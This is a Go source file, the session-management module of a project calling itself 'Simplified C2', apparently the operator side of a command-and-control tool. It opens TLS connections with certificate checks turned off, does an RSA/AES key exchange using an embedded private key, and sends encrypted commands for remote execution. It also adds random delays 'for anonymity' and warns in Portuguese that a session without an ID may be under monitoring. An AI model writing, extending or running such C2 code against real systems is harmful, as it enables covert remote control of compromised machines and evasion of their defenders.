package sessions

import (
	"crypto/tls"
	"encoding/binary"
	"encoding/gob"
	"fmt"
	"io"
	"math/rand"
	"net"
	"strings"
	"time"

	"github.com/simplified_c2/core/connector"
	"github.com/simplified_c2/core/crypto"
	"github.com/simplified_c2/module"

	_ "embed"
)

//go:embed private_key.pem
var privateKeyPEM []byte

type Session struct {
	ID         *connector.SecureBytes // Protected session ID
	Key        *connector.SecureBytes // Protected AES key
	IV         *connector.SecureBytes // Protected AES IV
	Path       string
	Conn       net.Conn
	Host       string
	Port       int
	Passphrase *connector.SecureBytes // Protected passphrase
	Connected  bool
	UseTLS     bool
}

type Module struct {
	Name        string
	Version     string
	Description string
	Author      string
	sessions    map[string]*Session
	current     *Session
}

func NewModule() *Module {
	return &Module{
		Name:        "sessions",
		Version:     "1.0.0",
		Description: "Module for managing multiple secure sessions with remote servers",
		Author:      "Simplified C2",
		sessions:    make(map[string]*Session),
		current:     nil,
	}
}

func (m *Module) GetInfo() *module.ModuleInfo {
	return &module.ModuleInfo{
		Name:        m.Name,
		Version:     m.Version,
		Description: m.Description,
		Author:      m.Author,
		Commands: []module.CommandInfo{
			{
				Name:        "connect",
				Description: "Connect to a new server or reconnect to an existing session",
				Usage:       "connect new <host> <port> <passphrase> | connect <session_id>",
				Options: map[string]string{
					"host":       "Server host (e.g., 127.0.0.1)",
					"port":       "Server port (e.g., 8443)",
					"passphrase": "Encryption passphrase",
					"session_id": "Session ID to reconnect",
				},
			},
			{
				Name:        "changesession",
				Description: "Switch to a different session",
				Usage:       "changesession <session_id>",
				Options: map[string]string{
					"session_id": "Session ID to switch to",
				},
			},
			{
				Name:        "listsessions",
				Description: "List all active and disconnected sessions",
				Usage:       "listsessions",
				Options:     map[string]string{},
			},
			{
				Name:        "execute",
				Description: "Execute a command in the current session",
				Usage:       "execute <command>",
				Options: map[string]string{
					"command": "Command to send to the server",
				},
			},
			{
				Name:        "status",
				Description: "Show current session status",
				Usage:       "status",
				Options:     map[string]string{},
			},
			{
				Name:        "register",
				Description: "Register a new session",
				Usage:       "register <host> <port> <passphrase> <session_id> <useTLS>",
				Options: map[string]string{
					"host":       "Server host",
					"port":       "Server port",
					"passphrase": "Encryption passphrase",
					"session_id": "Session ID",
					"useTLS":     "Use TLS (true/false)",
				},
			},
		},
		Options: map[string]string{
			"enabled": "true",
		},
	}
}

func (m *Module) Initialize() error {
	return nil
}

func (m *Module) ExecuteCommand(command string, args []string) (interface{}, error) {
	switch command {
	case "connect":
		if len(args) < 1 {
			return nil, fmt.Errorf("missing arguments: use 'connect new <host> <port> <passphrase> <useTLS>' or 'connect <session_id>'")
		}
		if args[0] == "new" {
			if len(args) < 5 {
				return nil, fmt.Errorf("missing arguments: use 'connect new <host> <port> <passphrase> <useTLS>'")
			}
			port, err := parsePort(args[2])
			if err != nil {
				return nil, err
			}
			useTLS := strings.ToLower(args[4]) == "true"
			return m.connectNew(args[1], port, args[3], useTLS)
		}
		return m.reconnect(args[0])

	case "changesession":
		if len(args) < 1 {
			return nil, fmt.Errorf("missing session ID")
		}
		return m.changeSession(args[0])

	case "listsessions":
		return m.listSessions(), nil

	case "execute":
		if len(args) < 1 {
			return nil, fmt.Errorf("missing command")
		}
		return m.executeCommand(strings.Join(args, " "))

	case "status":
		return m.getStatus(), nil

	case "register":
		if len(args) < 5 {
			return nil, fmt.Errorf("missing arguments: use 'register <host> <port> <passphrase> <session_id> <useTLS>'")
		}
		port, err := parsePort(args[1])
		if err != nil {
			return nil, err
		}
		useTLS := strings.ToLower(args[4]) == "true"
		sess, err := m.RegisterSession(args[0], port, args[2], useTLS, args[3])
		if err != nil {
			return nil, err
		}
		return fmt.Sprintf("Session %s registered", string(sess.ID.Get())), nil

	default:
		return nil, fmt.Errorf("unknown command: %s", command)
	}
}

func parsePort(portStr string) (int, error) {
	var port int
	_, err := fmt.Sscanf(portStr, "%d", &port)
	if err != nil {
		return 0, fmt.Errorf("invalid port: %v", err)
	}
	if port <= 0 || port > 65535 {
		return 0, fmt.Errorf("port out of range: %d", port)
	}
	return port, nil
}

func (m *Module) connectNew(host string, port int, passphrase string, useTLS bool) (string, error) {
	addr := fmt.Sprintf("%s:%d", host, port)
	var conn net.Conn
	var err error
	if useTLS {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		}
		conn, err = tls.Dial("tcp", addr, tlsConfig)
	} else {
		conn, err = net.Dial("tcp", addr)
	}
	if err != nil {
		return "", fmt.Errorf("connection failed: %v", err)
	}

	session, err := m.handshake(conn, host, port, passphrase, useTLS)
	if err != nil {
		conn.Close()
		return "", err
	}

	m.sessions[string(session.ID.Get())] = session
	m.current = session
	return fmt.Sprintf("Connected to %s with session ID: %s", addr, string(session.ID.Get())), nil
}

func (m *Module) reconnect(sessionID string) (string, error) {
	sess, ok := m.sessions[sessionID]
	if !ok {
		return "", fmt.Errorf("session not found: %s", sessionID)
	}
	if sess.Conn != nil && sess.Connected {
		return fmt.Sprintf("Session already connected: %s", sessionID), nil
	}
	if sess.Host == "" || sess.Port == 0 {
		return "", fmt.Errorf("no connection details available for session: %s", sessionID)
	}

	addr := fmt.Sprintf("%s:%d", sess.Host, sess.Port)
	var conn net.Conn
	var err error
	if sess.UseTLS {
		tlsConfig := &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
		}
		conn, err = tls.Dial("tcp", addr, tlsConfig)
	} else {
		conn, err = net.Dial("tcp", addr)
	}
	if err != nil {
		return "", fmt.Errorf("reconnection failed: %v", err)
	}

	newSession, err := m.handshake(conn, sess.Host, sess.Port, string(sess.Passphrase.Get()), sess.UseTLS)
	if err != nil {
		conn.Close()
		return "", err
	}

	m.sessions[string(newSession.ID.Get())] = newSession
	m.current = newSession
	return fmt.Sprintf("Reconnected to %s with session ID: %s", addr, string(newSession.ID.Get())), nil
}

func (m *Module) changeSession(sessionID string) (string, error) {
	sess, ok := m.sessions[sessionID]
	if !ok {
		return "", fmt.Errorf("session not found: %s", sessionID)
	}
	m.current = sess
	return fmt.Sprintf("Switched to session: %s", sessionID), nil
}

func (m *Module) listSessions() []string {
	fmt.Println("Listing sessions, total:", len(m.sessions)) // Log de depuração
	var result []string
	for id, sess := range m.sessions {
		tlsStatus := "no-tls"
		if sess.UseTLS {
			tlsStatus = "tls"
		}
		result = append(result, fmt.Sprintf("ID: %s, Host: %s, Port: %d, Passphrase: [protected], Status: %s, TLS: %s",
			id, sess.Host, sess.Port, statusString(sess.Connected), tlsStatus))
	}
	if len(result) == 0 {
		result = append(result, "No sessions registered")
	}
	return result
}

func statusString(connected bool) string {
	if connected {
		return "connected"
	}
	return "disconnected"
}

func (m *Module) executeCommand(command string) (string, error) {
	if m.current == nil {
		return "", fmt.Errorf("no active session")
	}
	if !m.current.Connected || m.current.Conn == nil {
		return "", fmt.Errorf("current session is disconnected")
	}

	// Random delay for anonymity (1-500ms)
	time.Sleep(time.Duration(rand.Intn(500)) * time.Millisecond)

	// Encrypt and send command
	encryptedCommand, err := crypto.AESEncrypt([]byte(command), m.current.Key.Get())
	if err != nil {
		return "", fmt.Errorf("encryption failed: %v", err)
	}
	if err := m.sendMessage(m.current.Conn, MSG_COMMAND, encryptedCommand); err != nil {
		m.current.Conn.Close()
		m.current.Conn = nil
		m.current.Connected = false
		return "", fmt.Errorf("error sending command: %v", err)
	}

	// Receive and decrypt response
	msgType, payload, err := m.receiveMessage(m.current.Conn)
	if err != nil {
		m.current.Conn.Close()
		m.current.Conn = nil
		m.current.Connected = false
		return "", fmt.Errorf("error receiving response: %v", err)
	}
	if msgType == MSG_ERROR {
		return "", fmt.Errorf("server error: %s", string(payload))
	}
	if msgType != MSG_RESPONSE {
		return "", fmt.Errorf("unexpected message type: %d", msgType)
	}

	output := string(payload)
	if strings.HasPrefix(output, "current directory: ") {
		newPath := strings.TrimPrefix(output, "current directory: ")
		m.current.Path = newPath
		output = fmt.Sprintf("New path: %s\n%s", newPath, output)
	}

	return output, nil
}

func (m *Module) handshake(conn net.Conn, host string, port int, passphrase string, useTLS bool) (*Session, error) {
	decoder := gob.NewDecoder(conn)
	encoder := gob.NewEncoder(conn)

	var sessionID string
	if err := decoder.Decode(&sessionID); err != nil {
		return nil, fmt.Errorf("failed to receive session ID: %v", err)
	}
	if sessionID == "" {
		return nil, fmt.Errorf("received empty session ID")
	}

	var encryptedKey, encryptedIV []byte
	if err := decoder.Decode(&encryptedKey); err != nil {
		return nil, fmt.Errorf("failed to receive encrypted key: %v", err)
	}
	if len(encryptedKey) == 0 {
		return nil, fmt.Errorf("received empty encrypted key")
	}

	if err := decoder.Decode(&encryptedIV); err != nil {
		return nil, fmt.Errorf("failed to receive encrypted IV: %v", err)
	}
	if len(encryptedIV) == 0 {
		return nil, fmt.Errorf("received empty encrypted IV")
	}

	key, err := crypto.RsaDecoding(privateKeyPEM, encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt session key: %v", err)
	}
	if len(key) != 32 {
		return nil, fmt.Errorf("invalid session key length: got %d, expected 32", len(key))
	}

	iv, err := crypto.RsaDecoding(privateKeyPEM, encryptedIV)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt session IV: %v", err)
	}
	if len(iv) != 16 {
		return nil, fmt.Errorf("invalid session IV length: got %d, expected 16", len(iv))
	}

	response := []byte{HANDSHAKE_OK}
	if err := encoder.Encode(response); err != nil {
		return nil, fmt.Errorf("failed to send handshake response: %v", err)
	}

	// Protect sensitive data with SecureBytes
	session := &Session{
		ID:         connector.NewBytes([]byte(sessionID)),
		Key:        connector.NewBytes(key),
		IV:         connector.NewBytes(iv),
		Path:       "/unknown",
		Conn:       conn,
		Host:       host,
		Port:       port,
		Passphrase: connector.NewBytes([]byte(passphrase)),
		Connected:  true,
		UseTLS:     useTLS,
	}

	// Add watcher for tamper detection
	watcher := &connector.Watcher{Name: "SessionWatcher"}
	session.ID.AddWatcher(watcher)
	session.Key.AddWatcher(watcher)
	session.IV.AddWatcher(watcher)
	session.Passphrase.AddWatcher(watcher)

	// Start periodic key refresh
	session.ID.RefreshKeyPeriodically()
	session.Key.RefreshKeyPeriodically()
	session.IV.RefreshKeyPeriodically()
	session.Passphrase.RefreshKeyPeriodically()

	return session, nil
}

func (m *Module) sendMessage(conn net.Conn, msgType byte, payload []byte) error {
	header := MessageHeader{
		Version:    PROTOCOL_VERSION,
		Type:       msgType,
		PayloadLen: uint32(len(payload)),
	}

	if err := binary.Write(conn, binary.BigEndian, header.Version); err != nil {
		return err
	}
	if err := binary.Write(conn, binary.BigEndian, header.Type); err != nil {
		return err
	}
	if err := binary.Write(conn, binary.BigEndian, header.PayloadLen); err != nil {
		return err
	}

	_, err := conn.Write(payload)
	return err
}

func (m *Module) receiveMessage(conn net.Conn) (byte, []byte, error) {
	var header MessageHeader
	if err := binary.Read(conn, binary.BigEndian, &header.Version); err != nil {
		return 0, nil, err
	}
	if err := binary.Read(conn, binary.BigEndian, &header.Type); err != nil {
		return 0, nil, err
	}
	if err := binary.Read(conn, binary.BigEndian, &header.PayloadLen); err != nil {
		return 0, nil, err
	}
	if header.Version != PROTOCOL_VERSION {
		return 0, nil, fmt.Errorf("unsupported protocol version: %d", header.Version)
	}

	encryptedPayload := make([]byte, header.PayloadLen)
	if _, err := io.ReadFull(conn, encryptedPayload); err != nil {
		return 0, nil, err
	}

	payload, err := crypto.AESDecrypt(encryptedPayload, m.current.Key.Get())
	if err != nil {
		return 0, nil, fmt.Errorf("decryption failed: %v", err)
	}
	return header.Type, payload, nil
}

func (m *Module) getStatus() map[string]interface{} {
	status := make(map[string]interface{})
	if m.current == nil {
		status["active_session"] = "none"
	} else {
		status["active_session"] = string(m.current.ID.Get())
		status["host"] = m.current.Host
		status["port"] = m.current.Port
		status["passphrase"] = "[protected]"
		status["path"] = m.current.Path
		status["connected"] = m.current.Connected
	}
	status["total_sessions"] = len(m.sessions)
	return status
}

func (m *Module) RegisterSession(host string, port int, passphrase string, useTLS bool, sessionID ...string) (*Session, error) {
	id := ""
	if len(sessionID) > 0 && sessionID[0] != "" {
		id = sessionID[0]
	} else {
		fmt.Println("SESSÃO SEM ID! POSSÍVELMENTE ESTÁ SENDO MONITORADA")
		return nil, fmt.Errorf("session ID cannot be empty")
	}

	// Aviso se a sessão já existe e será sobrescrita
	if _, exists := m.sessions[id]; exists {
		fmt.Printf("[!] Aviso: sobrescrevendo sessão existente com ID '%s'\n", id)
	}

	sess := &Session{
		ID:         connector.NewBytes([]byte(id)),
		Host:       host,
		Port:       port,
		Passphrase: connector.NewBytes([]byte(passphrase)),
		Path:       "/",
		Connected:  false,
		Conn:       nil,
		Key:        connector.NewBytes([]byte{}),
		IV:         connector.NewBytes([]byte{}),
		UseTLS:     useTLS,
	}

	// Add watcher for tamper detection
	watcher := &connector.Watcher{Name: "SessionWatcher"}
	sess.ID.AddWatcher(watcher)
	sess.Passphrase.AddWatcher(watcher)
	sess.Key.AddWatcher(watcher)
	sess.IV.AddWatcher(watcher)

	// Start periodic key refresh
	sess.ID.RefreshKeyPeriodically()
	sess.Passphrase.RefreshKeyPeriodically()
	sess.Key.RefreshKeyPeriodically()
	sess.IV.RefreshKeyPeriodically()

	m.sessions[id] = sess
	return sess, nil
}

// Constants for message types (aligned with main.go)
const (
	PROTOCOL_VERSION  = 1
	MSG_HANDSHAKE     = 1
	MSG_COMMAND       = 2
	MSG_RESPONSE      = 3
	MSG_FILE_UPLOAD   = 4
	MSG_FILE_DOWNLOAD = 5
	MSG_ERROR         = 255
	HANDSHAKE_OK      = 0
	HANDSHAKE_FAILED  = 1
)

type MessageHeader struct {
	Version    byte
	Type       byte
	PayloadLen uint32
}
